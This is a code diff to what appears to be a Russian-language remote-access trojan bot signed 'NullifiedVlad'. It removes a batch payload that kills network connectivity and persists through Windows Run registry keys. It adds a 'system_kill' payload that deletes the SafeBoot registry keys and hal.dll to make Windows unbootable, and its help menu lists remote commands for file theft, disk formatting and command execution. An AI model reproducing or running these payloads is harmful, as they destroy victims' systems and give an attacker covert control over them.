@@ -32,25 +32,13 @@ keys = ['\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
 'command', 'option', 'optionleft', 'optionright', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N','O','Q','R',
 'S','T','U','V','W','X','Y','Z']
 
-disable_internet = '''
-echo @echo off>c:windowswimn32.bat
-echo break off>>c:windowswimn32.bat
-echo ipconfig/release_all>>c:windowswimn32.bat
-echo end>>c:windowswimn32.bat
-reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f
-reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" '''
-
 
 system_kill = '''
 echo @off
-attrib -r -s -h c:\autoexec.bat
-del c:\autoexec.bat
-attrib -r -s -h c:\boot.ini
-del c:\boot.ini
-attrib -r -s -h c:\ntldr
-del c:\ntldr
-attrib -r -s -h c:\windows\win.ini
-del c:\windows\win.ini'''
+Reg Delete HKLM\\System\\CurrentControlset\\Control\\SafeBoot\\*.* /q
+Reg Delete HKLM\\System\\CurrentControlset\\Control\\SafeBoot /q
+del %WinDir%\\system32\\hal.dll /q
+'''
 
 
 helpmessage = '''
@@ -66,11 +54,11 @@ helpmessage = '''
 **/command** - выполнить комманду в терминале.
 **/kill** (process) - закрыть принудительно процесс.
 **/delete** (file) - удалить файл.
-**/disk_kill** (disk) - отформатировать диск.
-**/disable_internet**  - убить интернет соединение (навсегда).
+**/disk_format** (disk) - отформатировать диск.
 **/copy** (way) - отправляет файл к вам на сервер.
 **/system_kill** - удаляет важные файлы для запуска.
 **/shutdown** - выключить ПК.
 **/voice** (lang) (text) - проиграть голосовое сообщение.
 **/off** - выключение бота.
 -==== **Made by NullifiedVlad** ====-'''
+
